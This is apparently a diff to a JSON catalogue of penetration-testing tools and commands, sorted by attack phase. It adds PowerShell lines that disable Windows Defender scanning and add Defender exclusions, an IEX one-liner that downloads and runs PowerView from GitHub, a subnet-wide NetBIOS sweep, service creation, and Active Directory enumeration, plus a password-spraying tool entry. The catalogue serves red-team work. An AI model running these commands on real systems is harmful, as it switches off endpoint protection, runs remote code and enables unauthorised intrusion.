         "content": "\n\n## [[LSA Protection]]\n`Get-WinEvent -FilterHashtable @{ LogName='system'; Id='12' ; ProviderName='Microsoft-Windows-Wininit' }`\n\n## [[RDP]]\n`Get-WinEvent -FilterHashtable @{ LogName='Microsoft-Windows-TerminalServices-RDPClient/Operational'; id='1024' } | select timecreated, message | ft -AutoSize -Wrap`\n\n## [[COM Hijacking]]\nList COM objects\n`gwmi Win32_COMSetting | ? {$_.progid } | sort | ft ProgId,Caption,InprocServer32`\n\nList COM Object Methods for WScript.Shell.1\n`$o = [activator]::CreateInstance([type]::GetTypeFromProgID((\"WScript.Shell.1\"))) | gm`\n\n## [[Unquoted Service Path]]\nGet ACLs of services\n```ps\npowershell Get-Acl -Path \"C:\\Program Files\\Vuln Services\" | fl\n  \nPath   : Microsoft.PowerShell.Core\\FileSystem::C:\\Program Files\\Vuln Services\nOwner  : BUILTIN\\Administrators\nGroup  : wkstn1\\None\nAccess : CREATOR OWNER Allow  FullControl\n NT AUTHORITY\\SYSTEM Allow  FullControl\n BUILTIN\\Administrators Allow  FullControl\n BUILTIN\\Users Allow  Write, ReadAndExecute, Synchronize\n NT SERVICE\\TrustedInstaller Allow  FullControl\n APPLICATION PACKAGE AUTHORITY\\ALL APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize\n APPLICATION PACKAGE AUTHORITY\\ALL RESTRICTED APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize\n```\n\n## [[Common Language Runtime (CLR) Versions]]\n```ps\ndir %WINDIR%\\Microsoft.Net\\Framework\\ /s /b | find \"System.dll\"\n\n[System.IO.File]::Exists(\"$env:windir\\Microsoft.Net\\Framework\\v2.0.50727\\System.dll\")\n\n[System.IO.File]::Exists(\"$env:windir\\Microsoft.Net\\Framework\\v4.0.30319 System.dll\")\n```\n\n",
-        "commands": []
+        "commands": [
+            {
+                "id": "6183749c-eee5-42ca-a171-ac1b1a35a449",
+                "name": "Check LSA Protection",
+                "description": "",
+                "tag": "",
+                "results": [],
+                "cmd": "Get-WinEvent -FilterHashtable @{ LogName='system'; Id='12' ; ProviderName='Microsoft-Windows-Wininit' }"
+            },
+            {
+                "id": "cc43d2fa-b951-4f09-b37f-91f34ea5bbaf",
+                "name": "Get RDP Events",
+                "description": "",
+                "tag": "",
+                "results": [],
+                "cmd": "Get-WinEvent -FilterHashtable @{ LogName='Microsoft-Windows-TerminalServices-RDPClient/Operational'; id='1024' } | select timecreated, message | ft -AutoSize -Wrap"
+            },
+            {
+                "id": "bf3b2a29-c697-4835-aadd-02cf9a14dcbc",
+                "name": "Get all COM objects via wmi",
+                "description": "A lot of output",
+                "tag": "",
+                "results": [],
+                "cmd": "gwmi Win32_COMSetting | ? {$_.progid } | sort | ft ProgId,Caption,InprocServer32"
+            },
+            {
+                "id": "e6685b82-4fa3-4591-bc80-732a64a8cc28",
+                "name": "Get methods of COM object ",
+                "description": "List COM Object Methods for WScript.Shell.1",
+                "tag": "",
+                "results": [],
+                "cmd": "[activator]::CreateInstance([type]::GetTypeFromProgID((\"WScript.Shell.1\"))) | gm"
+            },
+            {
+                "id": "48b78655-db1f-4da0-9d31-f90cc810eb3e",
+                "name": "Get ACLs of services",
+                "description": "",
+                "tag": "",
+                "results": [],
+                "cmd": "powershell Get-Acl -Path \"C:\\Program Files\\Vuln Services\" | fl"
+            },
+            {
+                "id": "5c9766c7-293d-4110-bfeb-0aabfd061080",
+                "name": "Get CLR versions",
+                "description": "Get Common Language Runtime (CLR) versions",
+                "tag": "",
+                "results": [],
+                "cmd": "cmd.exe /c dir %WINDIR%\\Microsoft.Net\\Framework\\ /s /b | find \"System.dll\"\n\n[System.IO.File]::Exists(\"$env:windir\\Microsoft.Net\\Framework\\v2.0.50727\\System.dll\")\n[System.IO.File]::Exists(\"$env:windir\\Microsoft.Net\\Framework\\v4.0.30319 System.dll\")"
+            },
+            {
+                "id": "a8516fd7-ce4f-4c19-97c9-780aa299f594",
+                "name": "Disable Defender",
+                "description": "",
+                "tag": "",
+                "results": [],
+                "cmd": "Set-MpPreference -DisableRealtimeMonitoring $true\nSet-MpPreference -DisableBehaviorMonitoring $true\nSet-MpPreference -DisableScriptScanning $true\nSet-MpPreference -DisableArchiveScanning $true",
+                "requirements": {
+                    "tag": "PRIVS:ADMIN"
+                }
+            },
+            {
+                "id": "4e5c3ef8-0775-4d8e-af57-a82dc066e524",
+                "name": "Get Defender Status",
+                "description": "",
+                "tag": "",
+                "results": [],
+                "cmd": "Get-MpComputerStatus\nGet-MpPreference"
+            },
+            {
+                "id": "c6a72c8f-0734-4a95-9dfd-241ac41591b5",
+                "name": "Get Defender Exclusions",
+                "description": "",
+                "tag": "",
+                "results": [],
+                "cmd": "Get-MpPreference | Select-Object -ExpandProperty ExclusionPath\n\nSet-MpPreference -ExclusionPath PATH\\TO\\FOLDER\nSet-MpPreference -ExclusionExtension docx\nSet-MpPreference -ExclusionProcess Process",
+                "requirements": {
+                    "tag": "PRIVS:ADMIN"
+                }
+            },
+            {
+                "id": "52121667-91db-4042-910a-ae02121b82f3",
+                "name": "Get Defender Detections",
+                "description": "",
+                "tag": "",
+                "results": [],
+                "cmd": "Get-MpThreatDetection"
+            },
+            {
+                "id": "3c5b88d5-05d2-43bd-912a-d7025e4751f0",
+                "name": "Get Imported Modules",
+                "description": "",
+                "tag": "",
+                "results": [],
+                "cmd": "Get-Module -All"
+            },
+            {
+                "id": "7e1ff5f3-6e68-405c-81b5-64bba180e491",
+                "name": "Load Github Script Remotely",
+                "description": "Showed with an example of PowerView",
+                "tag": "",
+                "results": [],
+                "cmd": "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1'); Find-GPOLocation -UserName Administrator;"
+            },
+            {
+                "id": "7dc8490f-8454-4d39-83d5-43bcda1bc27c",
+                "name": "Launch C# via PowerShell",
+                "description": "",
+                "tag": "",
+                "results": [],
+                "cmd": "$id = get-random\n$assemblies = (\"System.Core\",\"System.Xml.Linq\",\"System.Data\",\"System.Xml\", \"System.Data.DataSetExtensions\", \"Microsoft.CSharp\")\nAdd-Type -ReferencedAssemblies $assemblies -TypeDefinition $code -Language CSharp\n$code = @\"\nusing System;\nnamespace HelloWorld\n{\n\tpublic class Program$id\n\t{\n\t\tpublic static void Main(){\n\t\t\tConsole.WriteLine(\"Hello world!\");\n\t\t}\n\t}\n}\n\"@\n \nAdd-Type -TypeDefinition $code -Language CSharp\t\niex \"[HelloWorld.Program$id]::Main()\""
+            },
+            {
+                "id": "91dc7ca7-51e5-414f-a6c7-37094cfa60e5",
+                "name": "PS-Remoting",
+                "description": "",
+                "tag": "",
+                "results": [],
+                "cmd": "Invoke-Command -ComputerName Test1-Win2k16 -ScriptBlock{Get-LocalGroupMember -Name 'Administrators'}",
+                "requirements": {
+                    "tag": "SERVICE:WINRM"
+                }
+            },
+            {
+                "id": "36c7d31c-865d-4e71-83fe-cd41b3560f42",
+                "name": "Get MSSQL Servers",
+                "description": "",
+                "tag": "",
+                "results": [],
+                "cmd": "ADForestInfoRootDomain = ([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()).RootDomain\n$ADForestInfoRootDomainDN = \"DC=\" + $ADForestInfoRootDomain -Replace(\"\\.\",',DC=')\n$ADDomainInfoLGCDN = 'GC://' + $ADForestInfoRootDomainDN\n$root = [ADSI]$ADDomainInfoLGCDN\n$ADSPNSearcher = new-Object System.DirectoryServices.DirectorySearcher($root,\"(serviceprincipalname=*sql*)\")\n$ADSPNSearcher.PageSize = 500\n$AllADSQLServerSPNs = $ADSPNSearcher.FindAll()"
+            },
+            {
+                "id": "94a5526d-cdc0-47e9-afd7-a14881beffe1",
+                "name": "Get latest MDE Detection",
+                "description": "",
+                "tag": "",
+                "results": [],
+                "cmd": "Get-MpThreatDetection |sort $_.InitialDetectionTime |select -First 1"
+            },
+            {
+                "id": "cfdc1559-6498-40c2-8bbe-e200e7a47ec1",
+                "name": "Get Registry Entry",
+                "description": "With the example of AppLocker and WDAC",
+                "tag": "",
+                "results": [],
+                "cmd": "#APPLOCKER\nGet-ChildItem -Path 'HKLM:\\Software\\Policies\\Microsoft\\Windows\\SRPV2'\nGet-ChildItem -Path 'HKLM:\\System\\CurrentControlSet\\Control\\SRP\\GP'\nGet-ChildItem -Path \n#WDAC\n'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\DeviceGuard -v DeployConfigCIPolicy'\nGet-ChildItem -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\DeviceGuard -v ConfigCIPolicyFilePath'"
+            }
+        ]
     },
     {
         "name": "PowerUp",
@@ -1734,8 +1981,7 @@
         "stealthy": false,
         "platforms": [
             "Linux",
-            "Windows",
-            "#mac"
+            "Windows"
         ],
         "source": "https://github.com/sensepost/ruler",
         "description": "Ruler is a tool that allows you to interact with Exchange servers remotely, through either the MAPI/HTTP or RPC/HTTP protocol. The main aim is abuse the client-side Outlook features and gain a shell remotely.",
@@ -1771,12 +2017,37 @@
         "platforms": [
             "Windows"
         ],
-        "source": "",
-        "description": "",
+        "source": "https://learn.microsoft.com/de-de/windows-server/administration/windows-commands/sc-config",
+        "description": "\u00c4ndert den Wert der Eintr\u00e4ge eines Diensts in der Registrierung und in der Service Control Manager-Datenbank.",
         "undetected": [],
         "detected": [],
-        "content": "\n## [[Services]]\n* Start service  \n`sc [<ServerName>] start <ServiceName>`\n* Stop dervice\n`sc [<ServerName>] stop <ServiceName>` \n* List all services\n`sc queryex type=service state=all`\n* List service names only\n`sc queryex type=service state=all | find /i \"SERVICE_NAME:\"`\n* Search for specific service\n`sc queryex type=service state=all | find /i \"SERVICE_NAME: myService\"`\n* Get security identifier, [read more](https://www.winhelponline.com/blog/view-edit-service-permissions-windows/)  \n`sc.exe sdshow [service_short_name]`\n\n\n",
-        "commands": []
+        "content": "\n## [[Services]]\n* Start service  \n'sc [<ServerName>] start <ServiceName>'\n* Stop dervice\n'sc [<ServerName>] stop <ServiceName>' \n* List all services\n'sc queryex type=service state=all'\n* List service names only\n'sc queryex type=service state=all | find /i \"SERVICE_NAME:\"'\n* Search for specific service\n'sc queryex type=service state=all | find /i \"SERVICE_NAME: myService\"'\n* Get security identifier, [read more](https://www.winhelponline.com/blog/view-edit-service-permissions-windows/)  \n'sc.exe sdshow [service_short_name]'\n\n\n",
+        "commands": [
+            {
+                "id": "643ef03f-1b97-47fb-a7b5-1937a62c23bf",
+                "name": "Create new service",
+                "description": "",
+                "tag": "",
+                "results": [],
+                "cmd": "sc.exe create CustomService binpath=\"\\\\c$\\temp\\customservice.exe\""
+            },
+            {
+                "id": "a38a805e-0f8a-44a7-a6d7-645667461264",
+                "name": "Get service configuration",
+                "description": "",
+                "tag": "",
+                "results": [],
+                "cmd": "sc.exe qc CustomService"
+            },
+            {
+                "id": "a38a805e-0f8a-44a7-a6d7-645347461264",
+                "name": "Get service status",
+                "description": "",
+                "tag": "",
+                "results": [],
+                "cmd": "sc.exe query CustomService"
+            }
+        ]
     },
     {
         "name": "Seatbelt",
@@ -2116,7 +2387,7 @@
         "commands": []
     },
     {
-        "name": "SprayingToolkit",
+        "name": "TREVORspray",
         "phases": [
             "01. Initial Access"
         ],
@@ -2125,11 +2396,11 @@
         "platforms": [
             "Python"
         ],
-        "source": "https://github.com/byt3bl33d3r/SprayingToolkit",
-        "description": "A set of Python scripts/utilities that _tries_ to make password spraying attacks against Lync/S4B & OWA a lot quicker, less painful and more efficient.",
+        "source": "https://github.com/blacklanternsecurity/TREVORspray",
+        "description": "TREVORspray is a modular password sprayer with threading, clever proxying, loot modules, and more! Multiple modules: msol (Office 365), adfs (Active Directory Federation Services), owa (Outlook Web App), okta (Okta SSO), anyconnect (Cisco VPN)",
         "undetected": [],
         "detected": [],
-        "content": "\n## [[Password Spraying]]\n\n",
+        "content": "",
         "commands": []
     },
     {
@@ -2359,7 +2630,6 @@
         "results": [],
         "category": "",
         "stealthy": false,
-        "opsec": false,
         "platforms": [
             "Windows"
         ],
@@ -2375,11 +2645,8 @@
         "phases": [
             "02. Reconnaissance"
         ],
-        "requirements": [],
-        "results": [],
         "category": "",
         "stealthy": false,
-        "opsec": false,
         "platforms": [
             "Linux"
         ],
@@ -2388,7 +2655,35 @@
         "undetected": [],
         "detected": [],
         "content": "",
-        "commands": []
+        "commands": [
+            {
+                "id": "7c296daf-1dda-4811-bdfe-0f74b2d7ee29",
+                "name": "Query A record",
+                "description": "",
+                "tag": "",
+                "results": [],
+                "cmd": "dig @nameserver name recordtype\ndig @1.1.1.1 apple.com A"
+            },
+            {
+                "id": "c16ec93a-68d6-4de4-9e40-ea23377b9d2d",
+                "name": "Get Domain Controller (Global Catalog) ",
+                "description": "Look up the Windows global catalog (GC) record and the authoritative domain server record to determine domain controller addresses",
+                "tag": "",
+                "results": [],
+                "cmd": "dig _gc. <domain>",
+                "requirements": {
+                    "tag": "INTEL:DOMAIN:DOMAINS"
+                }
+            },
+            {
+                "id": "d4866eaf-525f-47b1-9412-c9037706bada",
+                "name": "Server NS query",
+                "description": "",
+                "tag": "",
+                "results": [],
+                "cmd": "dig -t NS <domain>"
+            }
+        ]
     },
     {
         "name": "SauronEye",
@@ -2536,7 +2831,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Python"
         ],
         "source": "https://github.com/c3c/ADExplorerSnapshot.py",
@@ -2565,5 +2860,162 @@
             }
         ],
         "content": ""
+    },
+    {
+        "name": "nbtstat",
+        "phases": [
+            "02. Reconnaissance"
+        ],
+        "category": "",
+        "stealthy": false,
+        "platforms": [
+            "Windows"
+        ],
+        "source": "https://learn.microsoft.com/de-de/windows-server/administration/windows-commands/nbtstat",
+        "description": "Zeigt NetBIOS-\u00fcber TCP/IP-Protokollstatistiken (NetBT), NetBIOS-Namenstabellen f\u00fcr den lokalen Computer und Remotecomputer sowie den NetBIOS-Namenscache an. Dieser Befehl erm\u00f6glicht auch eine Aktualisierung des NetBIOS-Namenscaches und der Namen, die bei WINS (Windows Internet Name Service) registriert sind. Bei Verwendung ohne Parameter zeigt dieser Befehl Hilfeinformationen an.",
+        "undetected": [],
+        "detected": [],
+        "commands": [
+            {
+                "id": "7757830e-cd4e-4ab6-bbf6-d182c10ad1bf",
+                "name": "List MAC, hostname, domain",
+                "description": "",
+                "tag": "",
+                "results": [
+                    "INTEL:DOMAIN:COMPUTERS"
+                ],
+                "cmd": "for /L %i in (1,1,255) do @nbtstat -A 10.10.10.%i 2>nul && echo 10.10.10.%i"
+            },
+            {
+                "id": "e2acb67d-ffa3-4e66-a9f6-15ef95d7075c",
+                "name": "Show NetBIOS-Namenstabelle",
+                "description": "",
+                "tag": "",
+                "results": [
+                    "INTEL:DOMAIN:COMPUTERS"
+                ],
+                "cmd": "nbtstat -A <ip>",
+                "requirements": {
+                    "tag": "A"
+                }
+            }
+        ],
+        "content": "",
+        "references": []
+    },
+    {
+        "name": "Metasploit",
+        "phases": [
+            "02. Reconnaissance"
+        ],
+        "category": "",
+        "stealthy": false,
+        "platforms": [
+            "Python"
+        ],
+        "source": "https://www.metasploit.com/",
+        "description": "The world\u2019s most used penetration testing framework",
+        "undetected": [],
+        "detected": [],
+        "commands": [
+            {
+                "id": "4994f588-77be-4a93-aab2-a2e082cd40e4",
+                "name": "Get SMB Version",
+                "description": "",
+                "tag": "",
+                "results": [],
+                "cmd": "use auxiliary/scanner/smb/smb_version"
+            },
+            {
+                "id": "426ada86-74c3-4eca-99ab-b5d561ecd96e",
+                "name": "Get SMTP",
+                "description": "",
+                "tag": "",
+                "results": [],
+                "cmd": "use auxiliary/scanner/snmp/snmp_login"
+            }
+        ],
+        "content": "",
+        "references": []
+    },
+    {
+        "name": "MDI Check Instance",
+        "phases": [
+            "02. Reconnaissance"
+        ],
+        "category": "",
+        "stealthy": true,
+        "platforms": [
+            "Windows"
+        ],
+        "source": "https://github.com/thalpius/Microsoft-Defender-for-Identity-Check-Instance",
+        "description": "This script gets all accepted domains in Microsoft 365 using autodiscover, gets the tenant name and checks if there is a Microsoft Defender for Identity instance. This way you can figure out if a company runs Microsoft Defender for Identity.",
+        "undetected": [],
+        "detected": [],
+        "commands": [],
+        "content": "",
+        "references": []
+    },
+    {
+        "name": "Active Directory Service Interface",
+        "phases": [
+            "06. Domain Enumeration"
+        ],
+        "category": "",
+        "stealthy": false,
+        "platforms": [
+            "Windows"
+        ],
+        "source": "https://learn.microsoft.com/de-de/windows/win32/adsi/active-directory-service-interfaces-adsi",
+        "description": "Active Directory Service Interfaces (ADSI) ist eine Reihe von COM-Schnittstellen, die verwendet werden, um auf die Features von Verzeichnisdiensten aus verschiedenen Netzwerkanbietern zuzugreifen.",
+        "undetected": [],
+        "detected": [],
+        "commands": [
+            {
+                "id": "d53c8ab4-60b8-4a7c-bd0a-5b9215366d4d",
+                "name": "Get Domain Controller",
+                "description": "",
+                "tag": "",
+                "results": [
+                    "INTEL:DOMAIN:DC"
+                ],
+                "cmd": "[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers",
+                "requirements": {
+                    "tag": "S"
+                }
+            },
+            {
+                "id": "0513b338-00d6-40f6-9e27-e955c0faf923",
+                "name": "Enumerate Remote Users",
+                "description": "",
+                "tag": "",
+                "results": [
+                    "INTEL:DOMAIN:USERS"
+                ],
+                "cmd": "([ADSI]'WinNT://<computer>/Administrators').psbase.Invoke('Members') | %{$_.GetType().InvokeMember('Name', 'GetProperty', $null, $_, $null)}",
+                "requirements": {
+                    "and": [
+                        {
+                            "tag": "SERVICE:SMB"
+                        },
+                        {
+                            "tag": "COMPUTER:CONFIG:REMOTEMANAGEMENT"
+                        },
+                        {
+                            "or": [
+                                {
+                                    "tag": "COMPUTER:IP"
+                                },
+                                {
+                                    "tag": "COMPUTER:HOSTNAME"
+                                }
+                            ]
+                        }
+                    ]
+                }
+            }
+        ],
+        "content": "",
+        "references": []
     }
 ]
